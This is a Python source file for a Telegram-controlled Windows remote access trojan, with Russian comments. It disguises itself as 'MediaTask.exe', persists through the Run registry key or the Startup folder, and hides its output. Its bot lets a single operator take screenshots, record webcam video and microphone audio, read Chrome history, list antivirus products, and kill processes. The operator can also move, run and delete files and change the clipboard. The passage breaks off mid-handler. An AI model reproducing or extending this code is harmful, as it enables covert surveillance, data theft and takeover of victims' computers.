from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

from aiogram.types import ContentType
from aiogram.types import FSInputFile
from aiogram import Bot, Dispatcher, types, F
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

import psutil # может работать в фоне
import ctypes # может работать в фоне
import wmi # Проверка антивирусов, может работать в фоне
import asyncio # может работать в фоне
import os # может работать в фоне

from PIL import ImageGrab

import pyautogui # Скриншот
import cv2 # робота с камерой
import datetime  # для работы с датами и временем
import time
import pygetwindow as gw #Для сварачивания окон
import pyperclip #Для редоктирования буфера обмена
import pyaudio
import wave

import sqlite3
import webbrowser
import logging
import platform

import getpass
import subprocess
import socket
import requests
import aiohttp

import sys
import shutil
import GPUtil
import importlib.resources as resources
import winreg

from aiogram import Bot, Dispatcher, types

from config import ALLOWED_USER_ID, API_TOKEN
from pathlib import Path


destination_folder = r'C:\ProgramData\MediaTask'
os.makedirs(destination_folder, exist_ok=True)

directory = "C:/Users/Public/main"
os.makedirs(directory, exist_ok=True)
file_ids = []
def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        # Определите путь к текущему файлу
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name

        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')

if __name__ == '__main__':
    # Укажите имя встроенного ресурса и путь для сохранения
    resource_name = 'my_image.ico'  # Имя файла в корневом каталоге сборки
    output_path = directory + '/my_image.ico'  # Замените на путь для сохранения

    # Убедитесь, что путь существует
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    extract_file(resource_name, output_path)

def copy_and_rename(destination_folder, new_name, icon_path=None):
    # Получаем путь для нового файла
    new_file_path = os.path.join(destination_folder, new_name)

    # Проверяем, существует ли файл в целевой папке
    if os.path.exists(new_file_path):
        return "Файл уже существует. Копирование не требуется."

    # Получаем текущий путь исполняемого файла
    current_file = sys.argv[0]

    try:
        # Копируем файл в новую папку
        shutil.copy(current_file, new_file_path)

        # Изменение иконки файла, если указан путь к иконке
        if icon_path:
            rcedit_path = r'C:\path\to\rcedit.exe'  # Путь к rcedit
            subprocess.run([rcedit_path, new_file_path, '--set-icon', icon_path], check=True)

        return f"Файл успешно скопирован в {new_file_path} и иконка обновлена"
    except Exception as e:
        return f"Ошибка при копировании: {e}"

if __name__ == "__main__":
    destination_folder = r'C:\ProgramData\MediaTask'  # Укажите путь к папке
    new_name = 'MediaTask.exe'  # Укажите новое имя файла
    icon_path = directory + '/my_image.ico'  # Укажите путь к файлу иконки

    # Проверяем, существует ли целевая папка, если нет — создаем
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    # Копируем и переименовываем файл только при первом запуске
    result = copy_and_rename(destination_folder, new_name, icon_path)



def add_to_registry(script_path):
    try:
        # Открываем ключ реестра для автозагрузки
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)

        # Добавляем запись в реестр
        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)

        # Закрываем ключ реестра
        winreg.CloseKey(reg_key)

        return True
    except Exception:
        return False


def add_to_startup_folder(script_path):
    try:
        # Путь к папке автозагрузки
        startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        # Имя ярлыка
        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        # Проверка, существует ли уже ярлык
        if os.path.exists(shortcut_path):
            return

        # Создаем ярлык через PowerShell
        os.system(
            f'powershell -Command "$s = (New-Object -COM WScript.Shell).CreateShortcut(\'{shortcut_path}\'); $s.TargetPath=\'{script_path}\'; $s.Save()"')
    except Exception:
        pass


if __name__ == "__main__":
    # Путь к вашему скрипту
    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'

    # Попытка добавить в автозагрузку через реестр
    if not add_to_registry(script_path):
        # Если не удалось, добавляем через папку автозагрузки
        add_to_startup_folder(script_path)


sys.stdout = open(os.devnull, 'w')  # Отключение вывода на экран
sys.stderr = open(os.devnull, 'w')  # Отключение вывода ошибок




logging.basicConfig(level=logging.CRITICAL + 1)

# Отключаем логгер aiogram
logging.getLogger('aiogram').disabled = True

# Включаем логирование, чтобы не пропустить важные сообщения
logging.basicConfig(level=logging.INFO)


# Объект бота
bot = Bot(token=API_TOKEN)

# Диспетчер
dp = Dispatcher()




MAX_MESSAGE_LENGTH = 4096  # Максимальная длина сообщения для Telegram
# Объект бота
bot = Bot(token=API_TOKEN)

# Диспетчер
dp = Dispatcher()





@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = [
        [
            types.KeyboardButton(text="Антивирус"),
            types.KeyboardButton(text="Скриншот"),
        ],
        [
            types.KeyboardButton(text="Процесы"),
            types.KeyboardButton(text="Фото с камеры")
        ],
        [
            types.KeyboardButton(text="Полный отчет по процесам"),
            types.KeyboardButton(text="Завершить процесс")
        ],
        [
            types.KeyboardButton(text="Создать папку"),
            types.KeyboardButton(text="Удалить папку")
        ],
        [
            types.KeyboardButton(text="Содержание директории"),
            types.KeyboardButton(text="Переместиться по директории")
        ],
        [
            types.KeyboardButton(text="Данные ПК"),
            types.KeyboardButton(text="Диагностика сети")
        ],
        [
            types.KeyboardButton(text="Запись с веб камеры"),
            types.KeyboardButton(text="Запись аудио")
        ],
        [
            types.KeyboardButton(text="Открыть файл"),
            types.KeyboardButton(text="Загрузить файл")
        ],
        [
            types.KeyboardButton(text="Скачать файл"),
            types.KeyboardButton(text="Удалить файл")
        ],
        [
            types.KeyboardButton(text="Зашифровать файл"),
            types.KeyboardButton(text="Расшифровать файл")
        ],
        [
            types.KeyboardButton(text="История хрома"),
            types.KeyboardButton(text="История оперы")
        ],
        [
            types.KeyboardButton(text="ALT + F4"),
            types.KeyboardButton(text="Свернуть все окна")
        ],
        [
            types.KeyboardButton(text="Посмотреть буфер обмена"),
            types.KeyboardButton(text="Изменить буфер обмена")
        ],
        [
            types.KeyboardButton(text="Закрыть диспетчер задач"),
            types.KeyboardButton(text="Открыть ссылку")
        ],
        [
            types.KeyboardButton(text="Включить звук"),
            types.KeyboardButton(text="Выключить звук")
        ],
        [
            types.KeyboardButton(text="Звук на 100%"),
            types.KeyboardButton(text="CMD бомба")
        ],
        [
            types.KeyboardButton(text="Выключить ПК"),
            types.KeyboardButton(text="Перезагрузить ПК")
        ],
        [
            types.KeyboardButton(text="Перемистить файл"),
            types.KeyboardButton(text="Поменять обои")
        ],
        [
            types.KeyboardButton(text="Самоуничтожение"),
        ],
    ]
    keyboard = types.ReplyKeyboardMarkup(
        keyboard=kb,
        resize_keyboard=True,

    )
    await message.answer("Готов к использованию", reply_markup=keyboard)

# Хэндлер на кнопку /antivirus
@dp.message(F.text.lower() == "антивирус")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:

        def get_antivirus_programs():
            c = wmi.WMI(namespace="root/SecurityCenter2")
            antivirus_products = c.AntiVirusProduct()
            return [product.displayName for product in antivirus_products]

        if __name__ == "__main__":
            antivirus_programs = get_antivirus_programs()
            for program in antivirus_programs:
                await message.answer("Установленные антивирусные программы: " + program)

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер на кнопку /screenshot
@dp.message(F.text.lower() == "скриншот")
async def send_photo(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer('Сейчас будет Сер')
        # Делаем скриншот всего экрана
        screenshot = ImageGrab.grab()
        filename = "screenshot.png"
        filepath = os.path.join(directory, filename)

        screenshot.save(filepath)

        # Создаем объект FSInputFile
        photo = FSInputFile(filepath)
        # Отправляем фото с подписью
        await message.answer_photo(photo)

        if os.path.exists(filepath):
            os.remove(filepath)

        async def main():
            await dp.start_polling(bot)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер на кнопку /snapshot
@dp.message(F.text.lower() == "фото с камеры")
async def send_photo(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer('Сыыыыр!')
        filename = "snapshot.png"
        filepath = os.path.join(directory, filename)

        try:
            # Попробуем захватить видео с веб-камеры
            camera = cv2.VideoCapture(0)  # 0 - это индекс устройства камеры

            # Проверим, удалось ли открыть камеру
            if not camera.isOpened():
                raise RuntimeError("Не удалось открыть камеру, возможно она занята другим процессом.")

            # Сделаем снимок
            ret, frame = camera.read()
            if not ret:
                raise RuntimeError("Не удалось сделать снимок, возможно камера занята другим процессом.")

            # Сохраним изображение
            cv2.imwrite(filepath, frame)

            # Создаем объект FSInputFile для отправки фото
            photo = FSInputFile(filepath)
            await message.answer_photo(photo, caption="Вот ваше фото с веб-камеры!")

        except Exception as e:
            # Обрабатываем ошибки и отправляем пользователю
            await message.answer(f"Произошла ошибка при попытке сделать фото: {e}")

        finally:
            # Освобождаем ресурсы
            if 'camera' in locals() and camera.isOpened():
                camera.release()

            # Удаляем временный файл, если он был создан
            if os.path.exists(filepath):
                os.remove(filepath)

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер на кнопку /processes
@dp.message(F.text.lower() == "процесы")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:

        process_info_list = []

        for process in psutil.process_iter(['pid', 'name']):
            process_info = (
                f"PID: {process.info['pid']}, {process.info['name']}"
            )
            process_info_list.append(process_info)

        all_processes_info = "\n".join(process_info_list)

        # Разбиваем сообщение на части, если оно превышает лимит
        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер на кнопку /fullprocesses полный отчет по процесам
@dp.message(F.text.lower() == "полный отчет по процесам")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:

        process_info_list = []

        for process in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            process_info = (
                f"PID: {process.info['pid']}, Name: {process.info['name']}, "
                f"User: {process.info['username']}, CPU: {process.info['cpu_percent']}%, "
                f"Memory: {process.info['memory_info'].rss / (1024 * 1024):.2f} MB"
            )
            process_info_list.append(process_info)

        all_processes_info = "\n".join(process_info_list)

        # Разбиваем сообщение на части, если оно превышает лимит
        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class ProcessState(StatesGroup):
    waiting_for_pid = State()

# Хэндлер на команду завершения процесса
@dp.message(F.text.lower() == "завершить процесс")
async def cmd_andprocesses(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Укажите PID процесса.")
        await state.set_state(ProcessState.waiting_for_pid)  # Устанавливаем состояние ожидания PID
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Обработчик для получения PID от пользователя
@dp.message(ProcessState.waiting_for_pid)
async def process_pid(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        user_input = message.text

        # Проверка, является ли введенное значение числом
        if not user_input.isdigit():
            await message.answer(f"{user_input} - Не является PID.")
            await state.clear()  # Завершаем состояние
            return

        pid = int(user_input)  # Преобразуем строку в число

        try:
            process = psutil.Process(pid)
            process.terminate()  # Попробовать мягко завершить процесс
            process.wait(timeout=3)  # Подождать завершения процесса
            await message.answer(f"Процесс с PID {pid} успешно завершен.")
        except psutil.NoSuchProcess:
            await message.answer(f"Процесс с PID {pid} не найден.")
        except psutil.AccessDenied:
            await message.answer(f"Недостаточно прав для завершения процесса с PID {pid}.")
        except psutil.TimeoutExpired:
            await message.answer(f"Процесс с PID {pid} не завершился за отведенное время. Принудительное завершение.")
            process.kill()  # Принудительное завершение процесса
            await message.answer(f"Процесс с PID {pid} принудительно завершен.")
        # Завершаем состояние после успешной обработки
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
class Form(StatesGroup):
    folder_name = State()

# Хэндлер на кнопку /newfloader
@dp.message(F.text.lower() == "создать папку")
async def create_folder_command(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Укажите путь где создать папку и вконце название папки, пример:\n C:/Users/Public/Название_папки")
        await state.set_state(Form.folder_name)  # Переходим в состояние ожидания имени папки

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Form.folder_name)
async def process_folder_name(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        folder_name = message.text

        # Проверяем, содержит ли введенный текст полный путь (например, наличие "/")
        if os.path.dirname(folder_name):  # Если есть путь
            if not os.path.exists(folder_name):
                os.makedirs(folder_name, exist_ok=True)  # Создаем папку
                await message.answer(f"Папка '{folder_name}' успешно создана!")
                await state.clear()  # Сброс состояния после успешного завершения
            else:
                await message.answer(f"Папка с именем '{folder_name}' уже существует!")
                await state.clear()  # Сброс состояния после успешного завершения
        else:  # Если введено только название без пути
            await message.answer("Пожалуйста, укажите полный путь к папке, а не только её название.")
            # Перезапускаем процесс создания папки
            await message.answer("Попробуйте снова. Перезапустив процесс.")
            await state.clear()  # Сброс состояния после успешного завершения


    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waiting(StatesGroup):
    folder_name_delet = State()

# Хэндлер на кнопку /deletfloader
@dp.message(F.text.lower() == "удалить папку")
async def delet_folder_command(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Укажите путь и вконце название папки, пример:\n C:/Users/Public/Название_папки\n!!!Папка удаляется со всем содержимым!!!")
        await state.set_state(waiting.folder_name_delet)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Словарь для хранения количества некорректных вводов
incorrect_attempts = {}
@dp.message(waiting.folder_name_delet)
async def processdelet_folder_name(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    folder_name_delet = message.text

    # Инициализация счётчика некорректных вводов для пользователя
    if user_id not in incorrect_attempts:
        incorrect_attempts[user_id] = 0

    if message.from_user.id == ALLOWED_USER_ID:
        # Проверяем, существует ли папка
        if os.path.exists(folder_name_delet) and os.path.isdir(folder_name_delet):
            try:
                shutil.rmtree(folder_name_delet)
                await message.answer(f"Папка '{folder_name_delet}' и все её содержимое успешно удалены.")
                # Завершаем состояние после успешного удаления
                await state.set_state(None)
                # Сбрасываем счётчик некорректных вводов
                incorrect_attempts[user_id] = 0
            except Exception as e:
                await message.answer(f"Ошибка при удалении папки: {e}")
                # Завершаем состояние при критической ошибке
                await state.set_state(None)
        else:
            incorrect_attempts[user_id] += 1
            if incorrect_attempts[user_id] >= 1:
                await message.answer(f"Папка '{folder_name_delet}' не найдена. Пожалуйста, введите корректный путь к папке")
                await message.answer("Попробуйте снова. Перезапустив процесс.")
                await state.clear()

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waitingfile(StatesGroup):
    file_name_send = State()

# Хендлер для команды "скачать файл"
@dp.message(F.text.lower() == "скачать файл")
async def send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt"
        )
        await state.set_state(waitingfile.file_name_send)  # Переход в состояние ожидания пути файла
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(waitingfile.file_name_send)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directory_file = message.text  # Путь к файлу

        try:
            # Проверка наличия файла
            if not os.path.isfile(directory_file):
                await message.answer("Файл не найден. Проверьте путь и попробуйте снова.")
                await state.clear()  # Сброс состояния
                return

            # Проверка размера файла
            file_size = os.path.getsize(directory_file)
            max_size = 50 * 1024 * 1024  # 50 MB

            if file_size > max_size:
                await message.answer(f"Файл слишком большой ({file_size / (1024 * 1024):.2f} MB). Максимальный размер файла - 50 MB.")
                await state.clear()  # Сброс состояния
                return  # Завершаем выполнение функции, чтобы не продолжать обработку

            # Создание объекта для отправки
            document = FSInputFile(directory_file)

            # Отправка файла пользователю
            await message.answer_document(document)
            await state.clear()  # Сброс состояния
        except Exception as e:
            await message.answer(f"Произошла ошибка: {e}\n")
            await state.clear()  # Сброс состояния
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waitmas(StatesGroup):
    file_name_delet = State()
@dp.message(F.text.lower() == "удалить файл")
async def send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Укажите путь и расширение файла которого хотите удалить, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(waitmas.file_name_delet)  # Переходим в состояние ожидания имени папки

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(waitmas.file_name_delet)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directory_file_delet = message.text  # Путь к файлу
        # Проверяем, существует ли файл
        if os.path.exists(directory_file_delet):
            os.remove(directory_file_delet)  # Удаляем файл
            await message.answer(f"Файл '{directory_file_delet}' успешно удален.")
        else:
            await message.answer(f"Файл '{directory_file_delet}' не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.")
        await state.clear()  # Завершаем состояние (aiogram 3.x)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")


current_directory = "C:/"

class DirectoryState(StatesGroup):
    waiting_for_directory = State()

# Обработчик для показа содержимого директории
@dp.message(F.text == "Содержание директории")
async def show_directory_content(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        global current_directory
        try:
            files_and_dirs = os.listdir(current_directory)
            content = []
            for item in files_and_dirs:
                full_path = os.path.join(current_directory, item)
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    content.append(f"{item}  -  {size / (1024 * 1024):.2f} MB")
                else:
                    content.append(f"{item}")
            if content:
                content_text = "\n".join(content)
            else:
                content_text = "Папка пуста"
        except Exception as e:
            content_text = f"Ошибка: {str(e)}"

        await message.answer(f"Содержание директории '{current_directory}':`\n{content_text}`",parse_mode='MarkdownV2')
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
# Обработчик для перемещения по директории
@dp.message(F.text == "Переместиться по директории")
async def change_directory(message: types.Message, state: FSMContext):
    await message.answer("Введите путь к новой директории:")
    await state.set_state(DirectoryState.waiting_for_directory)

# Обработчик для ввода новой директории
@dp.message(DirectoryState.waiting_for_directory)
async def set_new_directory(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        global current_directory
        new_directory = message.text

        if os.path.isdir(new_directory):
            current_directory = new_directory
            await message.answer(f"Успешно переместился, вот текущая директория:\n{current_directory}")
        else:
            await message.answer("Неверный путь. Попробуйте снов.")

        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
tasks = {}

@dp.message(F.text.lower() == "история хрома")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        def get_chrome_history():
            # Путь к файлу истории Chrome (для Windows)
            history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')

            # Проверка, существует ли файл истории
            if not os.path.exists(history_path):
                return False, "Файл истории Chrome не найден. Возможно, браузер Chrome не установлен."

            # Создаем временную копию файла, так как файл может быть заблокирован для чтения
            temp_history_path = 'temp_history'
            shutil.copy2(history_path, temp_history_path)

            # Подключаемся к базе данных SQLite
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()

            # Запрос для извлечения истории посещенных страниц
            query = """
            SELECT urls.url, urls.title, urls.last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            """
            cursor.execute(query)

            rows = cursor.fetchall()

            # Переменная для накопления текста
            text_to_save = ""

            # Форматируем вывод
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]

                # Преобразуем время последнего посещения
                try:
                    if last_visit_time > 0:
                        # Преобразуем время в формат Unix timestamp
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    last_visit_time = f'Error: {str(e)}'

                # Накопление текста
                text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"

            # Полный путь к файлу
            file_path = os.path.join(directory, 'История_Хрома.txt')

            # Сохранение накопленного текста в файл
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(text_to_save)

            # Закрываем соединение
            conn.close()

            # Удаляем временный файл
            os.remove(temp_history_path)

            return True, file_path

        await message.answer("Получение истории Chrome. Пожалуйста, подождите...")
        success, result = get_chrome_history()

        if not success:
            await message.answer(result)
            return

        file_path = result
        try:
            # Загружаем файл для отправки
            file_to_send = FSInputFile(file_path)

            # Отправляем файл пользователю
            await message.answer_document(document=file_to_send, caption="Вот ваш файл!")

        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
        os.remove(file_path)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class webtime(StatesGroup):
    waiting_for_time = State()

# Хэндлер на кнопку "запись с веб камеры"
@dp.message(F.text == "Запись с веб камеры")
async def web_record(message: types.Message, state: FSMContext):
    await state.clear()  # Очищаем все предыдущие состояния
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Укажите длительность записи в секундах")
        await state.set_state(webtime.waiting_for_time)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(webtime.waiting_for_time)
async def start_recording(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        file_path = os.path.join(directory, 'Видео_с_вебки.mp4')

        try:
            # Проверка на корректное время записи
            try:
                recording_time = int(message.text)
                if recording_time <= 0:
                    raise ValueError("Длительность записи должна быть положительным числом.")
            except ValueError:
                await message.answer("Пожалуйста, укажите правильную длительность в секундах.")
                return

            await message.answer("Запись началась 📹...")

            # Запись видео с камеры
            try:
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    raise RuntimeError("Камера занята другим процессом.")

                # Используем кодек, который поддерживает MP4 (например, MP4V)
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(file_path, fourcc, 20.0, (640, 480))

                start_time = time.time()
                while int(time.time() - start_time) < recording_time:
                    ret, frame = cap.read()
                    if ret:
                        out.write(frame)
                    else:
                        break

                cap.release()
                out.release()
            except RuntimeError as e:
                await message.answer(f"Ошибка при доступе к камере: {e}")
                return
            except Exception as e:
                await message.answer(f"Ошибка при записи видео: {e}")
                return

            # Отправка видео как медиафайл
            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_video(file_to_send, caption="Вот запись с вебки!")
            except Exception as e:
                await message.answer(f"Ошибка при отправке видео: {e}")

        except Exception as e:
            await message.answer(f"Произошла ошибка при записи видео: {e}")

        finally:
            # Удаляем временные файлы
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except Exception as e:
                    await message.answer(f"Не удалось удалить файл {file_path}: {e}")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "alt + f4")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
  # Эмуляция нажатия Alt+F4
        pyautogui.hotkey('alt', 'f4')

        await message.answer("Окно было успешно закрыто✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "свернуть все окна")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        # Получаем список всех открытых окон
        windows = gw.getAllWindows()
        # Сворачиваем все окна
        for window in windows:
            if window.isMinimized == False:  # Проверяем, что окно не свернуто
                window.minimize()
        await message.answer("Окна были успешно свёрнуты✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Объявление состояний
class openfile(StatesGroup):
    waiting_for_dfile = State()

@dp.message(F.text.lower() == "открыть файл")
async def cmd_start(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Укажите путь и имя файла с его расширением, пример:\n C:/Users/Public/Название_файла.txt"
        )
        await state.set_state(openfile.waiting_for_dfile)  # Переход в состояние ожидания пути файла

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(openfile.waiting_for_dfile)
async def web_record_send(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directoryopn = message.text

        # Проверка существования файла
        if os.path.isfile(directoryopn):
            try:
                # Запуск .exe или .bat файла на Windows
                os.system(f'start "" "{directoryopn}"')
                await message.answer("Файл был успешно открыт ✅.")
            except Exception as e:
                await message.answer(f"Произошла ошибка при открытии файла: {e}")
        else:
            await message.answer(f"Файл {directoryopn} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.")

        await state.clear()  # Завершаем состояние (aiogram 3.x)

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class DirectoryStateSaveFiles(StatesGroup):
    waiting_for_directory_saveFiles = State()
    waiting_for_files = State()
    waiting_for_correct_directory = State()

MAX_ATTEMPTS = 1

# Обработчик для показа содержимого директории
@dp.message(F.text.lower() == "загрузить файл")
async def handle_text_message(message: types.Message, state: FSMContext):
    if message.text.lower() == "загрузить файл":
        if message.from_user.id == ALLOWED_USER_ID:
            await message.answer(
                "Укажите путь, куда необходимо загрузить файл, пример:\n C:/Users/Public"
            )
            await state.set_state(DirectoryStateSaveFiles.waiting_for_directory_saveFiles)  # Переход в состояние ожидания пути файла
            await state.update_data(attempts=0)  # Инициализация счетчика попыток

        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Обработчик для ввода новой директории
@dp.message(DirectoryStateSaveFiles.waiting_for_directory_saveFiles)
async def set_new_directory(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directoryForSaveFiles = message.text
        data = await state.get_data()
        attempts = data.get('attempts', 0)

        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
            attempts += 1
            if attempts >= MAX_ATTEMPTS:
                await message.answer("Не удалось найти директорию. Повторите попытку, перезапустив процесс.")
                await state.clear()  # Завершаем состояние

        else:
            await state.update_data(directoryForSaveFiles=directoryForSaveFiles, attempts=0)
            await message.answer(
                f'Отправьте файл, который будет сохранен по этому пути:\n{directoryForSaveFiles}')
            await state.set_state(DirectoryStateSaveFiles.waiting_for_files)

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Обработчик для обработки документа
@dp.message(DirectoryStateSaveFiles.waiting_for_files, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def handle_document(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        user_data = await state.get_data()
        directoryForSaveFiles = user_data.get('directoryForSaveFiles')

        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
            await message.reply("Необходимо сначала указать корректный путь для сохранения файла. \nПопробуйте снова, перезапустив команду.")
            await state.clear()
            return

        # Проверка наличия документа или фото
        if message.document:
            document = message.document
        elif message.photo:
            document = message.photo[-1]  # Используем самую высокую по разрешению фотографию
        else:
            await message.reply("В сообщении нет документа или фото.")
            return

        file_id = document.file_id
        file_name = document.file_name if hasattr(document, 'file_name') else "photo.jpg"  # Даем имя по умолчанию для фото

        try:
            await message.reply(f"Принял, сохраняю.")
            # Получаем информацию о файле
            file_info = await bot.get_file(file_id)
            file_path = file_info.file_path

            # Скачиваем файл
            file = await bot.download_file(file_path)

            # Сохраняем файл на диск
            save_path = os.path.join(directoryForSaveFiles, file_name)

            with open(save_path, 'wb') as f:
                f.write(file.read())

            await message.reply(f"Файл '{file_name}' успешно сохранен.")
            await state.clear()
        except Exception as e:
            await message.reply(f"Произошла ошибка при сохранении файла: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class microfonetime(StatesGroup):
    waiting_for_microtime = State()
    waiting_for_retry = State()  # Дополнительное состояние для повтора ввода

# Хэндлер на кнопку "запись аудио"
@dp.message(F.text.lower() == "запись аудио")
async def audio_record(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Укажите длительность записи в секундах")
        await state.set_state(microfonetime.waiting_for_microtime)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер для получения длительности записи
@dp.message(microfonetime.waiting_for_microtime)
async def process_audio_time_input(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            recording_time = int(message.text)  # Проверяем, является ли ввод числом
            await start_audio_recording(message, state, recording_time)  # Запуск записи
        except ValueError:
            await message.answer("Пожалуйста, укажите правильную длительность в секундах")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
# Хэндлер для повторного ввода времени
@dp.message(microfonetime.waiting_for_retry)
async def retry_audio_time_input(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            recording_time = int(message.text)
            await start_audio_recording(message, state, recording_time)
        except ValueError:
            await message.answer("Ввод некорректный. Задача завершена. Ожидаю новых команд.")
            await state.clear()  # Очищаем состояние и ждем новых команд
    else:
